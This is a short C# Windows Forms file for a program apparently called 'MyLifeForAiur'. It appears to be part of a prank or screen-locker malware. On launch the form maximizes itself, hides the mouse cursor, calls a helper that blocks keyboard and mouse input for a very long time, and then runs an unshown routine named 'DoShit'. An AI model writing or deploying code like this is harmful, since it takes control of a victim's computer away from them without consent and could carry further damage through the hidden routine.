using System.Windows.Forms;

namespace MyLifeForAiur
{
  public partial class MyLifeForAiur : Form
  {
    public MyLifeForAiur()
    {
      InitializeComponent();
      this.WindowState = FormWindowState.Maximized;
      Cursor.Hide();
      InputBlocker.BlockInput(10000000);
      Shit.DoShit(0);
    }
  }
}
